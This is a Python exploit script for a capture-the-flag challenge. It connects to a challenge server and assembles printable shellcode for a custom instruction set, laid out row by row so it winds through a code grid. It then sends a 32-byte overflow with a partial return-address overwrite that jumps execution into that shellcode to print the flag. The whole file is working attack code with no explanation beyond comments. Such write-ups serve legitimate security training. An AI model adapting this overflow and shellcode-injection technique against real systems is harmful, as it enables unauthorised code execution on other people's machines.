import socket
import sys
from curses.ascii import isprint

sock = socket.create_connection(("pwn-02.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1337))

# Writing some shellcode which will print us the flag.
load_into_ecx = b"\x31\x62"
load_into_edx = b"\x31\x63"
xor_ecx_edx = b"\x32\x32"
xor_esi_edx = b"\x32\x34" 
xor_edx_edx = b"\x32\x33"

add_edx_ecx = b"\x30\x23"
add_edx_edx = b"\x30\x33"
add_eax_edx = b"\x30\x30"
add_eax_ecx = b"\x30\x20"
add_ebx_ecx = b"\x30\x21"
add_ebx_edx = b"\x30\x31"

switch_eax = b"\x50\x60"
switch_ebx = b"\x50\x61"

rot_left = b"\x33\x41"
rot_right = b"\x33\x42"

syscall_flag = b"\x49\x40"

# We "snake through" the upper code block like so:
#
#
# ----> ...
# |
# <---  <---- <---- <---- <---- 
#                               |
# ----> ----> ----> ----> ----> |
#
# due to how the rotate command works - we continue for 1 move before rotating
# - it's easier to do it like this

# Set ECX = 1
# Start the process of setting EDX = 96 (gets it to 3)
code1 = [
    load_into_ecx,
    b"caaaaaaa",
    load_into_edx,
    b"baaaaaaa",
    xor_ecx_edx,
    xor_edx_edx,
    add_edx_ecx,
    add_edx_edx,
    rot_left,
    add_edx_ecx
    ]
code1 = b"".join(code1)

emptyrow1 = b"".join([b"aa"] * 0xf + [rot_left])
emptyrow2 = b"".join([rot_right] + [b"aa"] * 0xf)

# Set EDX = 96
# Sets real part of EAX to "i" by adding EDX then 1
# (not elegant or the fastest way, but it'll do)
code2 = [
    add_edx_edx,
    add_edx_edx,
    add_edx_edx,
    add_edx_edx,
    add_edx_edx,
    add_eax_edx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    rot_right,
    add_eax_ecx
] 
code2 = code2[::-1]
code2 = b"".join(code2)

code3 = [
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    switch_eax,
    add_eax_edx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_eax_ecx,
    add_ebx_edx,
    add_ebx_ecx,
    add_ebx_ecx,
    rot_left,
    add_ebx_ecx
] 
code3 = b"".join(code3)

code4 = [
    add_ebx_ecx,
    add_ebx_ecx,
    add_ebx_ecx,
    add_ebx_ecx,
    switch_ebx,
    add_ebx_edx,
    syscall_flag
] + [b"aa"] * 9

code4 = code4[::-1]
code4 = b"".join(code4)

code = [code1, emptyrow1, code2, emptyrow2, code3, emptyrow1, code4]

assert all(len(s) == 0x20 for s in code)
assert all(all(isprint(c) for c in s) for s in code)

def recv_until(sock, until):
     s = [sock.recv(1024)]
     while until not in s[-1]:
         s.append(sock.recv(1024))
     return b"".join(s)

print(repr(recv_until(sock, b"How many strings")))
sock.send(b"%d\n" % len(code))

for c in code:
  print(repr(recv_until(sock, b"Input")))
  sock.send(b"%s\n" % c)

print(repr(recv_until(sock, b"How many letters")))
sock.send(b"17\n")

print(repr(recv_until(sock, b"Your name please")))
junk = b"A" * 0x20
# partial overwrite - this jumps to our shellcode
ret_overwrite = b"\x40\x45"
sock.send(junk + ret_overwrite + b"\n")

print(repr(sock.recv(1024)))
print(repr(sock.recv(1024)))
